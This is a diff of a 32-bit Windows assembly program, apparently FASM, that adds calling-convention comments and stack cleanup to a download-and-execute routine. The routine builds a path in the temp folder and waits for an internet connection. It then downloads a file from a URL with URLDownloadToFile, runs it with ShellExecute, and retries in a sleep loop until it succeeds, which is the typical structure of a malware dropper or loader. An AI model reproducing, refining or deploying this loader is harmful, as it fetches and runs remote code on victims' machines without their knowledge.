@@ -44,37 +44,58 @@ section '.code' code readable executable
         start:
                 push tmpDir
                 push tmpDir
-                call [GetTempPath]
-
+                call [GetTempPath] ; stdcall (calling conventions)
+;----------------------------------------------------------------------------------------------
                 push tmpDir
                 push fileDir
                 push fileDir
-                call [strcpy_s]
+                call [strcpy_s] ; cdecl (calling conventions)
 
+                mov eax,4   ; size (4 bytes == 32 bit)
+                mov ebx,3   ; number of arguments
+                mul ebx     ; 4 * 3
+                add esp,eax ; clear stack
+;----------------------------------------------------------------------------------------------
                 push fileName
                 push fileDir
                 push fileDir
-                call [strcat_s]
+                call [strcat_s] ; cdecl (calling conventions)
 
+                mov eax,4   ; size (4 bytes == 32 bit)
+                mov ebx,3   ; number of arguments
+                mul ebx     ; 4 * 3
+                add esp,eax ; clear stack
+;----------------------------------------------------------------------------------------------
                 push s1
                 push param
                 push param
-                call [strcpy_s]
+                call [strcpy_s] ; cdecl (calling conventions)
 
+                mov eax,4   ; size (4 bytes == 32 bit)
+                mov ebx,3   ; number of arguments
+                mul ebx     ; 4 * 3
+                add esp,eax ; clear stack
+;----------------------------------------------------------------------------------------------
                 push fileDir
                 push param
                 push param
-                call [strcat_s]
+                call [strcat_s] ; cdecl (calling conventions)
+
+                mov eax,4   ; size (4 bytes == 32 bit)
+                mov ebx,3   ; number of arguments
+                mul ebx     ; 4 * 3
+                add esp,eax ; clear stack
+;----------------------------------------------------------------------------------------------
 restart:
                 push fileDir
-                call [PathFileExists]
+                call [PathFileExists] ; stdcall (calling conventions)
                 cmp eax,0
                 jz download ; false
                 jne execute ; true
 download:
                 push 0
                 push 0
-                call [InternetGetConnectedState]
+                call [InternetGetConnectedState] ; stdcall (calling conventions)
                 cmp eax,0
                 jz sleep ; false
 
@@ -83,7 +104,7 @@ download:
                 push fileDir
                 push url
                 push 0
-                call [URLDownloadToFile]
+                call [URLDownloadToFile] ; stdcall (calling conventions)
                 cmp eax,0
                 jne sleep  ; false
                 jz execute ; true
@@ -94,7 +115,7 @@ execute:
                 push s3
                 push s2
                 push 0
-                call [ShellExecute]
+                call [ShellExecute] ; stdcall (calling conventions)
                 jmp exit
 sleep:
                 mov eax,[sleepSeconds]
@@ -102,11 +123,11 @@ sleep:
                 mul ebx
 
                 push eax
-                call [Sleep]
+                call [Sleep] ; stdcall (calling conventions)
                 jmp restart
 exit:
                 push 0
-                call [ExitProcess]
+                call [ExitProcess] ; stdcall (calling conventions)
 
 section '.idata' import data readable
 
